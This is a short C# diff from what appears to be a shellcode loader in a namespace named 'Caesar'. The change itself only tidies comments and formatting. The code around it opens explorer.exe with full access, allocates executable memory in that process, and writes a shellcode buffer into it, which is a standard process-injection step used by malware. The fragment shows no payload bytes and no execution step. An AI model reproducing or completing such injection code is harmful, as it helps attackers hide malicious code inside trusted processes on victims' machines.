@@ -33,12 +33,10 @@ namespace Caesar
 
 			// get explorer handle
 			IntPtr hProcess = OpenProcess(0x001F0FFF, false, Process.GetProcessesByName("explorer")[0].Id);
-			// alloc memory
+			
+			// alloc memory, if no valid address returns, halt execution
 			IntPtr addr = VirtualAllocExNuma(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40, 0);
-			if (addr == null)
-			{
-				return;
-			}
+			if (addr == null) { return; }
 			IntPtr outSize;
 			// write shellcode
 			WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
